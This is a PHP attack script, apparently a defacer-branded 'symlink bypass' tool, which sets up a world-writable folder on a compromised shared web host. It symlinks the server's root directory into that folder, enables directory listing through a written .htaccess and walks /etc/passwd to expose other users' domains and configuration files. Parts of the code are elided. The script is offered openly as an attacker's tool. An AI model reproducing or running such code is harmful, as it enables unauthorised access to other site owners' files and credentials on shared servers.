<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Bypass ./Domains ./Users ./Config
 * --------------------
 * Coded by Kashmiri Cheetah
 *---------------------
 * Do not try to Copy my Code go and code by yourself
 *---------------------
 * Made In Dubai, UAE  2015
 *~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
@error_reporting(1);
@set_time_limit(0);
...
echo '<!DOCTYPE html>
<head>
<title>Bypass ./Config ./User ./Domain By Kashmiri Cheetah</title>
<link rel="shortcut icon" href="http://www.crossed-flag-pins.com/animated-flag-gif/gifs/Pakistan_240-animated-flag-gifs.gif"/>

<style type="text/css">
body {
background:
url("http://i.imgur.com/hg21xZ9.png") repeat , 
url("http://images3.alphacoders.com/585/585038.jpg") no-repeat center top,top left,top right;
...
<center><font color="RED"><h1>Symlink Bypass by Kashmiri Cheetah</h1>
</head>
</body>';
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    ...
    if ($_POST["m"] && !$_POST["passwd"] == "") {
        ...
        @mkdir("Kashmiri_Cheetah", 0777);
        @chdir("Kashmiri_Cheetah");
        @symlink("/", "root");
        $htaccess = "
Options all
Options +Indexes
...
", $etc_passwd);
        foreach ($etc_passwd as $passwd) {
            ...
            @symlink('/', 'Kashmiri_Cheetah/root');
        }
        echo "<center><a href='Kashmiri_Cheetah/root'><h1>./ root</h1></a><br>
<br>
<center><a href='Kashmiri_Cheetah'><h1>./ Configurations</h1></a><br>";
    ...
    <p align=center>Pak Cyber Attackers t00l with PHP .. Maked By Kashmiri_Cheetah..!</p><center>";
    ...
    (c)0d3d By <a href='https://www.facebook.com/100001942648326'>Kashmiri_Cheetah</a> | <br>
     
    MaDe in Dubai, UAE by Kashmiri Cheetah (r)
